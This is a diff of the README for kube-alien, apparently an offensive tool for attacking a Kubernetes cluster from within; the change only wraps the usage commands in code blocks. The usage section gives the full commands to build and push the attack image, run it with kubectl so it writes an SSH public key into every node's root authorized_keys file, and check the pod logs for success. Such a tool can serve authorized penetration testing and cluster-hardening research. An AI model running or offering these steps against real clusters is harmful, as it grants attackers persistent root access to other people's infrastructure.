@@ -20,22 +20,22 @@ How can k8s cluster be attacked from within in a real life?
 
 # Usage
 Kube-alien image should be pushed to your dockerhub(or other registry) before using with this tool.
-
+```
 git clone https://github.com/nixwizard/kube-alien.git<BR>
 cd kube-alien<BR>
 docker build -t ka ./<BR>
 docker tag ka YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka<BR>
 docker push YOUR_DOCKERHUB_ACCOUNT/kube-alien:ka<BR>
-
+```
 The AUTHORIZED_KEYS env required to be set to the value of your ssh public key, in case of success the public key will be added to all 
 node's root's authorized_keys file.<BR>
-
+```
 kubectl run --image=YOUR_DOCKERHUB_ACCOUNT/kube-alien kube-alien --env="AUTHORIZED_KEYS=$(cat ~/.ssh/id_rsa.pub)" --restart Never<BR>
-
+```
 or you may use my image for quick testing purpose:<BR>
-
+```
 kubectl run --image=nixwizard/kube-alien kube-alien --env="AUTHORIZED_KEYS="$(cat ~/.ssh/id_rsa.pub)" --restart Never<BR>
-
+```
 Check Kube-alien pod's logs to see if attack was successful:<BR>
 kubectl logs $(kubectl get pods| grep alien|cut -f1 -d' ')<BR>
 
